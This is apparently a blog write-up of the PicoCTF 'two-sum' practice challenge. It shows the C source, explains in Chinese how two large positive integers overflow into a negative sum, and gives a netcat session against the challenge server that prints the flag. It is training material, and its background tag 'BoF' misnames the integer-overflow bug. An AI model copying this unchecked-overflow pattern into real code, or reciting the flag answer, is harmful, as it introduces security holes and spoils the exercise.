---
title: PicoCTF - two-sum
tags: [PicoCTF, CTF, PWN]

category: "Security/Practice/PicoCTF/PWN"
---

# PicoCTF - two-sum
<!-- more -->

## Background
BoF

## Source code
:::spoiler
```cpp!
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);
    
    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}

```
:::

## Recon
以初學的角度來說還蠻有趣的，看了一下source code，顯然是要滿足`addIntOvf()`的條件，也就是輸入的兩個數都大於零，但相加小於零，==OR==，兩個數都小於零但相加卻大於零，我是用第一種啦，比較直觀，首先輸入兩個超大的數，但還落在int正數的範圍，這樣就可以滿足一開始都大於零的條件，接著相加就會落在int負數的地方，這樣就滿足第三個條件，我有再另外輸入一次，這次是$9999999999999999+9999999999999999=19999999999999998$，這個就落在int負數的地方，解析出來的結果是`-545128450`

## Exploit
```bash
$ nc saturn.picoctf.net 50369
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
9999999999999999
9999999999999999
You entered 1874919423 and 1874919423
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4}
$ nc saturn.picoctf.net 58903
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
19999999999999998
19999999999999998
You entered -545128450 and -545128450
No overflow
```